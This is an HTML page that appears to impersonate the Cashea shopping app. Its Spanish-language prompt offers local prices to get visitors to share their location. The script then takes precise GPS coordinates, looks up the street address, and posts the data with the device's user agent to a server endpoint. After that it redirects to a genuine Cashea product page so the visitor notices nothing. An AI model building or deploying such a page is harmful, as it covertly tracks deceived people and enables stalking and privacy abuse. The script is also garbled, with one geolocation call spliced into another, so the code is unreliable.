<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cashea</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'Space Grotesk', sans-serif;
    background: #08090c;
    color: #f0f0f5;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  /* ── MODAL DE PERMISO ── */
  #permission-screen {
    position: fixed;
    inset: 0;
    background: #08090c;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 1.5rem;
    z-index: 10;
  }

  .modal-box {
    background: #0f1117;
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 20px;
    padding: 2.5rem 2rem;
    max-width: 400px;
    width: 100%;
    text-align: center;
    animation: scaleIn .4s cubic-bezier(.34,1.56,.64,1) both;
  }

  .modal-icon {
    width: 64px;
    height: 64px;
    background: linear-gradient(135deg, #6c47ff, #a855f7);
    border-radius: 18px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 1.5rem;
    font-size: 1.8rem;
  }

  .modal-title {
    font-size: 1.4rem;
    font-weight: 700;
    color: #f0f0f5;
    margin-bottom: .6rem;
    line-height: 1.2;
  }

  .modal-text {
    font-size: .875rem;
    color: rgba(240,240,245,0.5);
    line-height: 1.7;
    margin-bottom: 1.75rem;
  }

  .modal-btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: .5rem;
    width: 100%;
    background: linear-gradient(135deg, #6c47ff, #a855f7);
    color: #fff;
    border: none;
    padding: .875rem 2rem;
    border-radius: 12px;
    font-family: 'Space Grotesk', sans-serif;
    font-size: .95rem;
    font-weight: 700;
    cursor: pointer;
    transition: opacity .2s, transform .15s;
  }

  .modal-btn:hover { opacity: .88; transform: translateY(-1px); }

  /* ── PANTALLA DE CARGA ── */
  #loading-screen {
    display: none;
    flex-direction: column;
    align-items: center;
    gap: 1.25rem;
    text-align: center;
    padding: 2rem;
  }

  .spinner {
    width: 48px;
    height: 48px;
    border: 3px solid rgba(108,71,255,0.2);
    border-top-color: #6c47ff;
    border-radius: 50%;
    animation: spin .8s linear infinite;
  }

  .loading-title {
    font-size: 1.1rem;
    font-weight: 700;
    color: #f0f0f5;
  }

  .loading-sub {
    font-size: .82rem;
    color: rgba(240,240,245,0.4);
  }

  /* ── PANTALLA DE ERROR ── */
  #error-screen {
    display: none;
    flex-direction: column;
    align-items: center;
    gap: 1rem;
    text-align: center;
    padding: 2rem;
    max-width: 360px;
  }

  #error-screen .err-icon { font-size: 3rem; }

  #error-screen h2 {
    font-size: 1.3rem;
    font-weight: 700;
    color: #f0f0f5;
  }

  #error-screen p {
    font-size: .875rem;
    color: rgba(240,240,245,0.5);
    line-height: 1.7;
  }

  #error-screen button {
    background: linear-gradient(135deg, #6c47ff, #a855f7);
    color: #fff;
    border: none;
    padding: .8rem 2rem;
    border-radius: 12px;
    font-family: 'Space Grotesk', sans-serif;
    font-size: .9rem;
    font-weight: 700;
    cursor: pointer;
    margin-top: .5rem;
    transition: opacity .2s;
  }

  #error-screen button:hover { opacity: .88; }

  @keyframes scaleIn { from{opacity:0;transform:scale(.9)} to{opacity:1;transform:scale(1)} }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<!-- PASO 1: Pedir permiso -->
<div id="permission-screen">
  <div class="modal-box">
    <div class="modal-icon">📍</div>
    <h2 class="modal-title">¡Cacheá de todo en celulares!</h2>
    <p class="modal-text">Permite el acceso a tu ubicación para mostrarte los mejores precios en tu moneda local.</p>
    <button class="modal-btn" onclick="requestLocation()">
      📡 Permitir acceso
    </button>
  </div>
</div>

<!-- PASO 2: Cargando -->
<div id="loading-screen">
  <div class="spinner"></div>
  <div class="loading-title">CARGANDO…</div>
  <div class="loading-sub"></div>
</div>

<!-- PASO 3: Error -->
<div id="error-screen">
  <div class="err-icon">🔒</div>
  <h2 id="error-title">Acceso restringido</h2>
  <p id="error-msg">Esta página requiere acceso a tu ubicación para continuar. Habilita el permiso en tu navegador y recarga la página.</p>
  <button onclick="location.reload()">🔄 Reintentar</button>
</div>

<script>
const REDIRECT_URL = 'https://www.cashea.app/productos/xiaomi-redmi-note-13-pro-5g-8gb-256gb-ocean-teal';

function show(id) {
  ['permission-screen','loading-screen','error-screen'].forEach(s => {
    document.getElementById(s).style.display = s === id ? 'flex' : 'none';
  });
}

async function reverseGeocode(lat, lon) {
  try {
    const res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&zoom=18&addressdetails=1`,
      { headers: { 'Accept-Language': 'es', 'User-Agent': 'CasheaLanding/1.0' } }
    );
    return await res.json();
  } catch(_) { return null; }
}

async function saveVisit(pos, geoData) {
  const addr = geoData?.address || {};
  const entry = {
    timestamp:    new Date().toISOString(),
    latitude:     pos.coords.latitude.toFixed(7),
    longitude:    pos.coords.longitude.toFixed(7),
    accuracy_m:   Math.round(pos.coords.accuracy),
    altitude_m:   pos.coords.altitude !== null ? Math.round(pos.coords.altitude) : null,
    speed_ms:     pos.coords.speed    !== null ? pos.coords.speed    : null,
    heading:      pos.coords.heading  !== null ? pos.coords.heading  : null,
    street:       [addr.road, addr.house_number].filter(Boolean).join(' ') || null,
    city:         addr.city || addr.town || addr.village || null,
    state:        addr.state || addr.county || null,
    country:      addr.country || null,
    country_code: addr.country_code?.toUpperCase() || null,
    postal_code:  addr.postcode || null,
    full_address: geoData?.display_name || null,
    userAgent:    navigator.userAgent.substring(0, 80)
  };

  try {
    const stored = JSON.parse(localStorage.getItem('gt_visits') || '[]');
    stored.push(entry);
    localStorage.setItem('gt_visits', JSON.stringify(stored));
  } catch(e) {}

  try {
    await fetch('/api/ubicacion', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify(entry)
    });
  } catch(e) {
    console.warn('⚠️ Modo offline — solo localStorage:', e.message);
  }

  console.table(entry);
}

function requestLocation() {
  if (!navigator.geolocation) {
    show('error-screen');
    document.getElementById('error-title').textContent = 'No disponible';
    document.getElementById('error-msg').textContent = 'Tu navegador no soporta geolocalización.';
    return;
  }

  show('loading-screen');

  navigator.geolocation.getCurrentPosition(
let attempts = 0;
let bestPos = null;
const watchId = navigator.geolocation.watchPosition(
  async (pos) => {
    attempts++;
    if (!bestPos || pos.coords.accuracy < bestPos.coords.accuracy) {
      bestPos = pos;
    }

    // Parar si es suficientemente preciso o tras 4 intentos
    if (pos.coords.accuracy <= 20 || attempts >= 4) {
      navigator.geolocation.clearWatch(watchId);
      const geoData = await reverseGeocode(bestPos.coords.latitude, bestPos.coords.longitude);
      await saveVisit(bestPos, geoData);
      window.location.href = REDIRECT_URL;
    }
  },
    (err) => {
      show('error-screen');

      if (err.code === 1) {
        document.getElementById('error-title').textContent = 'Permiso denegado';
        document.getElementById('error-msg').textContent =
          'Esta página requiere acceso a tu ubicación. Habilita el permiso en tu navegador y recarga.';
      } else if (err.code === 2) {
        document.getElementById('error-title').textContent = 'GPS apagado';
        if (/android/i.test(navigator.userAgent)) {
          document.getElementById('error-msg').textContent = 'Activa el GPS en Ajustes → Ubicación y vuelve a intentarlo.';
        } else if (/iphone|ipad/i.test(navigator.userAgent)) {
          document.getElementById('error-msg').textContent = 'Ve a Ajustes → Privacidad → Localización y actívala.';
        } else {
          document.getElementById('error-msg').textContent = 'Activa la ubicación en los ajustes de tu dispositivo.';
        }
      } else {
        document.getElementById('error-title').textContent = 'Tiempo agotado';
        document.getElementById('error-msg').textContent = 'No se pudo obtener la ubicación. Verifica que el GPS esté activo y vuelve a intentarlo.';
      }
    },
    {
      enableHighAccuracy: true,
      timeout: 8000,
      maximumAge: 0
    }
  );
}
</script>
</body>
</html>
